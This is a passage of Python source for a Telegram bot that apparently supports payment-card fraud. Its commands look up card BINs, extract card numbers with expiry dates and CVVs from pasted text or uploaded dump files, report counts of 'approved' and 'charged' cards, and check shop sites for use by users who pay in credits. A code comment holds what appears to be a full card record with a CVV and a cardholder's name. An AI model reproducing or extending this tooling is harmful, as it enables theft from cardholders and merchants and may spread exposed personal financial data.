                # Try to find card number in multi-line message
                import re
                # Look for patterns: 16 digits or digits with |
                card_pattern = r'(\d{13,19}(?:\|\d{1,2}\|\d{2,4}\|\d{3,4})?)'
                matches = re.findall(card_pattern, reply_text)
                
                if matches:
                    bin_number = matches[0]  # Take first match
                else:
                    # Fallback: use the whole text
                    bin_number = reply_text
        
        # If no reply, get from command text
        if not bin_number:
            bin_number = event.text.split(None, 1)[1].strip() if len(event.text.split()) > 1 else ""
        
        # Parse BIN from card format (supports: 411111 or 411111|12|24|123 or full card)
        if '|' in bin_number:
            bin_number = bin_number.split('|')[0].strip()
        
        # Clean and validate
        bin_number = bin_number.replace(' ', '').strip()
        
        if not bin_number or len(bin_number) < 6 or not bin_number[:6].isdigit():
            await event.reply("❌ Invalid BIN format.\n\n**Usage:** /bin 411111\n**Or reply to a message with:** /bin", reply_to=event.id, link_preview=False)
            return
        
        # Lookup BIN info
        bin_info = await lookup_bin(bin_number)
        
        if "error" in bin_info:
            await event.reply(f"❌ BIN lookup failed: {bin_info['error']}", reply_to=event.id, link_preview=False)
            return
        
        # Format response
        response = f"""B!N: **{bin_number[:6]}**
Bank: **{bin_info.get('bank', 'N/A')}**
Brand: **{bin_info.get('tier', 'N/A')}**
Category: **{bin_info.get('category', 'N/A')}**
Scheme: **{bin_info.get('network', 'N/A')}**
Type: **{bin_info.get('card_type', 'N/A')}**
Country: **{bin_info.get('country', 'N/A')} {bin_info.get('flag', '🏳️')}**"""
        
        await event.reply(response, parse_mode='Markdown', link_preview=False)
        
    except Exception as e:
        print(f"Error in /bin: {e}")
        try:
            await status_msg.edit("❌ Error during BIN lookup. Try again later.")
        except:
            await event.reply("❌ Error during BIN lookup. Try again later.", link_preview=False)

@require_membership
@client.on(events.NewMessage(pattern=r'^/fl(\s|$)'))
async def card_filter_command(event):
    """Extract and format cards from text or file - Old /fl functionality with file support"""
    try:
        import re
        
        # Get text from reply, file, or command
        text_to_filter = ""
        is_file = False
        status_msg = None
        
        # Check if replying to a message
        if event.is_reply:
            replied_msg = await event.get_reply_message()
            
            # Check if it's a file
            if replied_msg.document:
                is_file = True
                file_name = replied_msg.document.attributes[0].file_name if replied_msg.document.attributes else "file.txt"
                
                if not file_name.endswith('.txt'):
                    return await event.reply("❌ Only .txt files are supported!", link_preview=False)
                
                # Check file size (10MB limit)
                file_size = replied_msg.document.size
                max_size = 10 * 1024 * 1024  # 10MB in bytes
                
                if file_size > max_size:
                    size_mb = file_size / (1024 * 1024)
                    return await event.reply(
                        f"❌ **File Too Large!**\n\n"
                        f"📁 Your file: `{size_mb:.2f} MB`\n"
                        f"📏 Maximum allowed: `10 MB`\n\n"
                        f"💡 **Solution:**\n"
                        f"• Split your file into smaller parts (< 10MB)\n"
                        f"• Then use `/fl` on each part",
                        link_preview=False
                    )
                
                status_msg = await event.reply("⏳ Downloading and extracting cards...", link_preview=False)
                
                # Download and read file
                file_path = await replied_msg.download_media()
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    text_to_filter = f.read()
                os.remove(file_path)
            elif replied_msg and replied_msg.text:
                text_to_filter = replied_msg.text
        else:
            # Get from command text
            parts = event.text.split(None, 1)
            if len(parts) > 1:
                text_to_filter = parts[1]
        
        if not text_to_filter:
            await event.reply("❌ No text to filter.\n\n**Usage:**\n/fl <text with cards>\n**Or reply to a message/file with:** /fl", reply_to=event.id, link_preview=False)
            return
        
        # Try to extract cards using the improved extract_card function
        filtered_cards = []
        
        # Pattern 1: Standard format (CC|MM|YY|CVV)
        standard_pattern = r'\b(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b'
        standard_matches = re.findall(standard_pattern, text_to_filter)
        
        for match in standard_matches:
            cc, mm, yy, cvv = match
            if len(yy) == 4:
                yy = yy[2:]
            mm = mm.zfill(2)
            card = f"{cc}|{mm}|{yy}|{cvv}"
            if card not in filtered_cards:
                filtered_cards.append(card)
        
        # Pattern 2: Format with MM/YY (CC|MM/YY|CVV|extra data...)
        # Example: 4519932115187098|06/26|334|Melissa Demerchant|...
        slash_pattern = r'\b(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})'
        slash_matches = re.findall(slash_pattern, text_to_filter)
        
        for match in slash_matches:
            cc, mm, yy, cvv = match
            if len(yy) == 4:
                yy = yy[2:]
            mm = mm.zfill(2)
            card = f"{cc}|{mm}|{yy}|{cvv}"
            if card not in filtered_cards:
                filtered_cards.append(card)
        
        # Find all 13-16 digit card numbers for multi-line format
        card_numbers = re.findall(r'\b(\d{13,16})\b', text_to_filter)
        
        if not card_numbers and not filtered_cards:
            if is_file and status_msg:
                await status_msg.delete()
            await event.reply("❌ No cards found!", reply_to=event.id, link_preview=False)
            return
        
        # For each card number, look for MM/YY and CVV in the next few lines
        lines = text_to_filter.splitlines()
        for i, line in enumerate(lines):
            # Check if this line contains a card number
            cc_match = re.search(r'\b(\d{13,16})\b', line)
            if cc_match:
                cc = cc_match.group(1)
                
                # Look in the next 5 lines for MM/YY and CVV
                mm = yy = cvv = None
                search_text = '\n'.join(lines[i:min(i+6, len(lines))])
                
                # Look for CVV with or without label
                cvv_match = re.search(r'(?:CVV|CVC|CVV2|CODE)[\s:]*(\d{3,4})', search_text, re.IGNORECASE)
                if cvv_match:
                    cvv = cvv_match.group(1)
                else:
                    # Look for CVV without label (3-4 digits on its own line)
                    for next_line in lines[i+1:min(i+6, len(lines))]:
                        cvv_match = re.search(r'^\s*(\d{3,4})\s*$', next_line)
                        if cvv_match:
                            potential_cvv = cvv_match.group(1)
                            # Make sure it's not a year or zip code
                            if len(potential_cvv) == 3 or (len(potential_cvv) == 4 and not potential_cvv.startswith('20')):
                                cvv = potential_cvv
                                break
                
                # Look for EXP with or without label
                exp_match = re.search(r'(?:EXP|EXPIRY|EXPIRATION|VALID|DATE)[\s:]*(\d{2})[/\s-]+(\d{2,4})', search_text, re.IGNORECASE)
                if exp_match:
                    part1, part2 = exp_match.groups()
                    # Determine month and year
                    if len(part2) == 4 or int(part2) > 12:
                        mm, yy = part1, part2
                    else:
                        mm, yy = part1, part2
                    
                    if len(yy) == 4:
                        yy = yy[2:]
                    mm = mm.zfill(2)
                else:
                    # Look for MM/YY without label
                    exp_match = re.search(r'\b(\d{2})[/\s-]+(\d{2,4})\b', search_text)
                    if exp_match:
                        part1, part2 = exp_match.groups()
                        if len(part2) == 4 or int(part2) > 12:
                            mm, yy = part1, part2
                        else:
                            mm, yy = part1, part2
                        
                        if len(yy) == 4:
                            yy = yy[2:]
                        mm = mm.zfill(2)
                
                # If we have all parts, add the card
                if mm and yy and cvv:
                    card = f"{cc}|{mm}|{yy}|{cvv}"
                    if card not in filtered_cards:
                        filtered_cards.append(card)
        
        # Format output
        total_cards = len(filtered_cards)
        
        if total_cards == 0:
            if is_file and status_msg:
                await status_msg.delete()
            await event.reply("❌ No valid cards found!", reply_to=event.id, link_preview=False)
            return
        
        # Send results
        if is_file:
            # Create and send filtered file
            filtered_file_name = f"filtered_cards[@shopifyfucker_bot].txt"
            with open(filtered_file_name, 'w') as f:
                f.write('\n'.join(filtered_cards))
            
            await client.send_file(
                event.chat_id,
                filtered_file_name,
                caption=f"✅ **Extracted Cards**\n\n📝 Total: `{total_cards}` cards",
                reply_to=event.id
            )
            
            os.remove(filtered_file_name)
            if status_msg:
                await status_msg.delete()
        else:
            # Format each card individually for one-click copy
            cards_lines = [f"`{card}`" for card in filtered_cards]
            cards_text = "\n".join(cards_lines)
            
            # Check message length and split if needed
            if len(cards_text) > 4000:
                # Split into multiple messages
                chunks = []
                current_chunk = []
                current_length = 0
                
                for card_line in cards_lines:
                    if current_length + len(card_line) + 1 > 4000:
                        chunks.append(current_chunk)
                        current_chunk = [card_line]
                        current_length = len(card_line)
                    else:
                        current_chunk.append(card_line)
                        current_length += len(card_line) + 1
                
                if current_chunk:
                    chunks.append(current_chunk)
                
                # Send chunks
                for chunk in chunks:
                    chunk_text = "\n".join(chunk)
                    await event.reply(chunk_text, reply_to=event.id, link_preview=False)
            else:
                await event.reply(cards_text, reply_to=event.id, link_preview=False)
        
    except Exception as e:
        print(f"Error in /fl: {e}")
        await event.reply("❌ Error filtering cards. Try again later.", reply_to=event.id, link_preview=False)

@require_membership
@client.on(events.NewMessage(pattern=r'^/stats(\s|$)'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", link_preview=False)

    try:
        credits_data = await load_json(CREDITS_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)

        stats_content = "🔥 **BOT STATISTICS REPORT** 🔥\n"
        stats_content += "=" * 50 + "\n\n"

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"📅 Generated on: {current_time}\n\n"

        stats_content += "👥 **USER STATISTICS**\n"
        stats_content += "-" * 30 + "\n"

        # Count VIP and Free users from credits.json
        vip_users = {}
        free_users = {}
        
        for user_id, user_data in credits_data.items():
            if user_data.get('plan') == 'VIP':
                vip_users[user_id] = user_data
            else:
                free_users[user_id] = user_data

        total_users = len(credits_data)
        total_vip = len(vip_users)
        total_free = len(free_users)

        stats_content += f"📊 Total Unique Users: {total_users}\n"
        stats_content += f"💎 VIP Users: {total_vip}\n"
        stats_content += f"🆓 Free Users: {total_free}\n\n"

        # Premium groups section
        premium_groups = await load_json(PREMIUM_GROUPS_FILE)
        stats_content += "👥 GROUP STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        total_premium_groups = len(premium_groups)
        stats_content += f"💎 Premium Groups: {total_premium_groups}\n\n"

        if premium_groups:
            stats_content += "💎 PREMIUM GROUPS DETAILS\n"
            stats_content += "-" * 30 + "\n"

            for group_id, group_data in premium_groups.items():
                expiry_date = datetime.datetime.fromisoformat(group_data['expiry'])
                if expiry_date.tzinfo is not None:
                    expiry_date = expiry_date.replace(tzinfo=None)
                current_date = datetime.datetime.now()

                status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0

                stats_content += f"Group ID: {group_id}\n"
                stats_content += f"  Status: {status}\n"
                stats_content += f"  Days Given: {group_data.get('days', 'N/A')}\n"
                stats_content += f"  Added By: {group_data.get('added_by', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"

        if vip_users:
            stats_content += "💎 VIP USERS DETAILS\n"
            stats_content += "-" * 30 + "\n"

            for user_id, user_data in vip_users.items():
                expiry_date_str = user_data.get('expiry_date')
                
                if expiry_date_str:
                    try:
                        expiry_date = datetime.datetime.fromisoformat(expiry_date_str)
                        if expiry_date.tzinfo is not None:
                            expiry_date = expiry_date.replace(tzinfo=None)
                        current_date = datetime.datetime.now()

                        status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                        days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0

                        stats_content += f"User ID: {user_id}\n"
                        stats_content += f"  Status: {status}\n"
                        stats_content += f"  Credits: {user_data.get('credits', 0)}\n"
                        stats_content += f"  Activated: {user_data.get('plan_set_date', 'N/A')[:10]}\n"
                        stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                        stats_content += f"  Days Remaining: {days_remaining}\n"
                        stats_content += "-" * 20 + "\n"
                    except:
                        stats_content += f"User ID: {user_id}\n"
                        stats_content += f"  Status: ERROR\n"
                        stats_content += "-" * 20 + "\n"
                else:
                    stats_content += f"User ID: {user_id}\n"
                    stats_content += f"  Status: NO EXPIRY SET\n"
                    stats_content += "-" * 20 + "\n"

        stats_content += "\n🌐 SITES STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_sites_count = sum(len(sites) for sites in user_sites.values())
        users_with_sites = len([uid for uid, sites in user_sites.items() if sites])

        stats_content += f"📈 Total Sites Added: {total_sites_count}\n"
        stats_content += f"👤 Users with Sites: {users_with_sites}\n"

        if user_sites:
            stats_content += f"\nSites per User:\n"
            for user_id, sites in user_sites.items():
                if sites:
                    stats_content += f"  User {user_id}: {len(sites)} sites\n"
                    for site in sites:
                        stats_content += f"    - {site}\n"

        stats_content += f"\n🔑 KEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_keys = len(keys_data)
        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])
        unused_keys = total_keys - used_keys

        stats_content += f"🔢 Total Keys Generated: {total_keys}\n"
        stats_content += f"✅ Used Keys: {used_keys}\n"
        stats_content += f"⏳ Unused Keys: {unused_keys}\n"

        if keys_data:
            stats_content += f"\nKeys Details:\n"
            for key, key_data in keys_data.items():
                status = "USED" if key_data.get('used', False) else "UNUSED"
                used_by = key_data.get('used_by', 'N/A')
                days = key_data.get('days', 'N/A')
                created = key_data.get('created_at', 'N/A')
                used_at = key_data.get('used_at', 'N/A')

                stats_content += f"  Key: {key}\n"
                stats_content += f"    Status: {status}\n"
                stats_content += f"    Days Value: {days}\n"
                stats_content += f"    Created: {created}\n"
                if status == "USED":
                    stats_content += f"    Used By: {used_by}\n"
                    stats_content += f"    Used At: {used_at}\n"
                stats_content += "-" * 15 + "\n"

        # Credit System Statistics
        credits_data = await load_json(CREDITS_FILE)
        redeem_keys_data = await load_json(REDEEM_KEYS_FILE)
        
        stats_content += f"\n💰 CREDIT SYSTEM STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        
        total_users_with_credits = len(credits_data)
        total_credits_distributed = sum(user.get('credits', 0) for user in credits_data.values())
        total_credits_used = sum(user.get('total_used', 0) for user in credits_data.values())
        
        # Count users by plan
        free_plan_users = len([u for u in credits_data.values() if u.get('plan') == 'Free'])
        premium_plan_users = len([u for u in credits_data.values() if u.get('plan') == 'Premium'])
        vip_plan_users = len([u for u in credits_data.values() if u.get('plan') == 'VIP'])
        
        stats_content += f"👥 Total Users with Credits: {total_users_with_credits}\n"
        stats_content += f"💵 Total Credits Available: {total_credits_distributed}\n"
        stats_content += f"📊 Total Credits Used: {total_credits_used}\n"
        stats_content += f"🆓 Free Plan Users: {free_plan_users}\n"
        stats_content += f"👑 Premium Plan Users: {premium_plan_users}\n"
        stats_content += f"💎 VIP Plan Users: {vip_plan_users}\n\n"
        
        # Redeem Keys Statistics
        total_redeem_keys = len(redeem_keys_data)
        redeemed_keys = len([k for k, v in redeem_keys_data.items() if v.get('redeemed', False)])
        unredeemed_keys = total_redeem_keys - redeemed_keys
        total_redeem_credits = sum(k.get('credits', 0) for k in redeem_keys_data.values())
        redeemed_credits = sum(k.get('credits', 0) for k in redeem_keys_data.values() if k.get('redeemed', False))
        
        stats_content += f"🔑 REDEEM KEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🔢 Total Keys: {total_redeem_keys}\n"
        stats_content += f"✅ Redeemed Keys: {redeemed_keys}\n"
        stats_content += f"⏳ Unredeemed Keys: {unredeemed_keys}\n"
        stats_content += f"💰 Total Credits in Keys: {total_redeem_credits}\n"
        stats_content += f"💸 Credits Redeemed: {redeemed_credits}\n"
        stats_content += f"💵 Credits Remaining: {total_redeem_credits - redeemed_credits}\n\n"
        
        # List unused keys
        if redeem_keys_data:
            unused_keys = [(k, v) for k, v in redeem_keys_data.items() if not v.get('redeemed', False)]
            if unused_keys:
                stats_content += f"⏳ UNUSED REDEEM KEYS\n"
                stats_content += "-" * 30 + "\n"
                for key, key_data in unused_keys:
                    credits = key_data.get('credits', 0)
                    created = key_data.get('created_at', 'N/A')
                    stats_content += f"🔑 {key}\n"
                    stats_content += f"   💰 Credits: {credits}\n"
                    stats_content += f"   📅 Created: {created}\n"
                stats_content += "\n"
        
        # Top users by credits
        if credits_data:
            sorted_users = sorted(credits_data.items(), key=lambda x: x[1].get('credits', 0), reverse=True)[:10]
            if sorted_users:
                stats_content += f"🏆 TOP 10 USERS BY CREDITS\n"
                stats_content += "-" * 30 + "\n"
                for idx, (user_id, user_data) in enumerate(sorted_users, 1):
                    plan = user_data.get('plan', 'Free')
                    credits = user_data.get('credits', 0)
                    used = user_data.get('total_used', 0)
                    plan_emoji = "💎" if plan == "VIP" else "🆓"
                    stats_content += f"{idx}. User {user_id} {plan_emoji}\n"
                    stats_content += f"   Credits: {credits} | Used: {used} | Plan: {plan}\n"
                stats_content += "\n"
        
        # All users with balance
        if credits_data:
            all_sorted_users = sorted(credits_data.items(), key=lambda x: x[1].get('credits', 0), reverse=True)
            stats_content += f"👥 ALL USERS WITH BALANCE\n"
            stats_content += "-" * 30 + "\n"
            stats_content += f"Total: {len(all_sorted_users)} users\n\n"
            for user_id, user_data in all_sorted_users:
                plan = user_data.get('plan', 'Free')
                credits = user_data.get('credits', 0)
                used = user_data.get('total_used', 0)
                plan_emoji = "💎" if plan == "VIP" else "🆓"
                plan_date = user_data.get('plan_set_date', 'N/A')
                
                # Format date
                date_str = "N/A"
                if plan_date and plan_date != 'N/A':
                    try:
                        date_obj = datetime.datetime.fromisoformat(plan_date)
                        date_str = date_obj.strftime("%d %b %Y")
                    except:
                        date_str = plan_date
                
                stats_content += f"User: {user_id} {plan_emoji}\n"
                stats_content += f"  💰 Balance: {credits} | 📊 Used: {used}\n"
                stats_content += f"  📋 Plan: {plan} | 📅 Date: {date_str}\n"
                stats_content += "-" * 20 + "\n"
            stats_content += "\n"
        
        stats_content += f"👑 ADMIN STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🛡️ Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"

        if os.path.exists(CC_FILE):
            try:
                async with aiofiles.open(CC_FILE, "r", encoding="utf-8") as f:
                    cc_content = await f.read()
                cc_lines = cc_content.strip().split('\n') if cc_content.strip() else []
                approved_cards = len([line for line in cc_lines if 'APPROVED' in line])
                charged_cards = len([line for line in cc_lines if 'CHARGED' in line])

                stats_content += f"\n💳 CARD STATISTICS\n"
                stats_content += "-" * 30 + "\n"
                stats_content += f"📊 Total Processed Cards: {len(cc_lines)}\n"
                stats_content += f"✅ Approved Cards: {approved_cards}\n"
                stats_content += f"💎 Charged Cards: {charged_cards}\n"
            except:
                pass

        stats_content += "\n" + "=" * 50 + "\n"
        stats_content += "📋 END OF REPORT 📋"

        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:
            await f.write(stats_content)

        await event.reply("📊 𝘽𝙤𝙩 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨 𝙧𝙚𝙥𝙤𝙧𝙩 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙!", file=stats_filename, link_preview=False)

        os.remove(stats_filename)

    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙨𝙩𝙖𝙩𝙨: {e}", link_preview=False)

@require_membership
@client.on(events.NewMessage(pattern=r'(?i)^[/.]check(\s|$)'))
async def check_sites(event):
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("check"):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":
        return await event.reply(banned_user_message(), link_preview=False)

    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙤𝙧 𝙁𝙧𝙚𝙚", f"https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)

    check_text = event.raw_text[6:].strip()

    if not check_text:
        buttons = [
            [Button.inline("🔍 𝘾𝙝𝙚𝙘𝙠 𝙈𝙮 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨", b"check_db_sites")]
        ]

        instruction_text = """🔍 **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠𝙚𝙧**

𝙄𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙨𝙞𝙩𝙚𝙨 𝙩𝙝𝙚𝙣 𝙩𝙮𝙥𝙚:

`/check`
`1. https://example.com`
`2. https://site2.com`
`3. https://site3.com`

𝘼𝙣𝙙 𝙞𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨 𝙖𝙣𝙙 𝙖𝙙𝙙 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 & 𝙧𝙚𝙢𝙤𝙫𝙚 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙡𝙞𝙘𝙠 𝙗𝙚𝙡𝙤𝙬 𝙗𝙪𝙩𝙩𝙤𝙣:"""

        return await event.reply(instruction_text, buttons=buttons, link_preview=False)

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:
        return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!\n\n💡 𝙀𝙭𝙖𝙢𝙥𝙡𝙚:\n`/check`\n`1. https://example.com`\n`2. site2.com`", link_preview=False)

    asyncio.create_task(process_site_check(event, sites_to_check))

async def process_site_check(event, sites):
    """Process site checking in background"""
    total_sites = len(sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_msg = await event.reply(f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {total_sites} 𝙨𝙞𝙩𝙚𝙨...```", link_preview=False)

    batch_size = 10
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            if result["status"] == "working":
                working_sites.append({"site": site, "price": result["price"]})
            else:
                dead_sites.append({"site": site, "price": result["price"]})

            working_count = len(working_sites)
            dead_count = len(dead_sites)
            
            working_sites_text = ""
            if working_sites:
                working_sites_text = "✅ **Working Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(working_sites, 1)]
                ) + "\n"
            dead_sites_text = ""
            if dead_sites:
                dead_sites_text = "❌ **Dead Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(dead_sites, 1)]
                ) + "\n"

            status_text = (
                f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨...\n\n"
                f"📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]\n"
                f"✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}\n"
                f"❌ 𝘿𝙚𝙖𝙙: {dead_count}\n\n"
                f"🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}\n"
                f"📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}\n"
                f"💰 𝙋𝙧𝙞𝙘𝙚: {result['price']}\n"
                f"```\n"
            )
            if working_sites_text or dead_sites_text:
                status_text += working_sites_text + dead_sites_text

            try:
                await status_msg.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    final_text = f"""✅ **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}

"""
    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    buttons = []
    if working_sites:
        # Fix button data size limit by truncating if too long
        working_sites_data = "|".join([site_data['site'] for site_data in working_sites])
        button_data = f"add_working:{event.sender_id}:{working_sites_data}"
        
        # Telegram button data limit is 64 bytes
        if len(button_data.encode()) > 60:  # Leave some margin
            # Truncate sites data to fit within limit
            max_sites = 0
            while max_sites < len(working_sites):
                test_data = f"add_working:{event.sender_id}:" + "|".join([site_data['site'] for site_data in working_sites[:max_sites+1]])
                if len(test_data.encode()) > 60:
                    break
                max_sites += 1
            
            if max_sites > 0:
                working_sites_data = "|".join([site_data['site'] for site_data in working_sites[:max_sites]])
                button_data = f"add_working:{event.sender_id}:{working_sites_data}"
            else:
                # If even one site is too long, skip the button
                button_data = None
        
        if button_data:
            buttons.append([Button.inline("➕ 𝘼𝙙𝙙 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨 𝙩𝙤 𝘿𝘽", button_data.encode())])

    try:
        await status_msg.edit(final_text, buttons=buttons)
    except Exception as e:
        print(f"Error editing message: {e}")
        try:
            await event.reply(final_text, buttons=buttons, link_preview=False)
        except Exception as e2:
            print(f"Error replying with buttons: {e2}")
            # Send without buttons as fallback
            await event.reply(final_text, link_preview=False)

# Button callback handlers
@require_membership
@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return

    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])

    if not user_sites:
        return await event.answer("❌ 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨 𝙮𝙚𝙩!", alert=True)

    await event.answer("🔍 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝘿𝘽 𝙨𝙞𝙩𝙚 𝙘𝙝𝙚𝙘𝙠...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):
    """Check user's DB sites and remove dead ones"""
    user_id = event.sender_id
    total_sites = len(user_sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_text = f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {total_sites} 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨...```"
    await event.edit(status_text)

    batch_size = 10
    for i in range(0, len(user_sites), batch_size):
        batch = user_sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            if result["status"] == "working":
                working_sites.append(site)
            else:
                dead_sites.append(site)

            working_count = len(working_sites)
            dead_count = len(dead_sites)

            status_text = f"""```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨...

📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]
✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}
❌ 𝘿𝙚𝙖𝙙: {dead_count}

🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}
📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}```"""

            try:
                await event.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    if dead_sites:
        sites_data = await load_json(SITE_FILE)
        sites_data[str(user_id)] = working_sites
        await save_json(SITE_FILE, sites_data)

    final_text = f"""✅ **𝘿𝘽 𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙): {len(dead_sites)}

"""

    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site}`\n"
        final_text += "\n"

    if dead_sites:
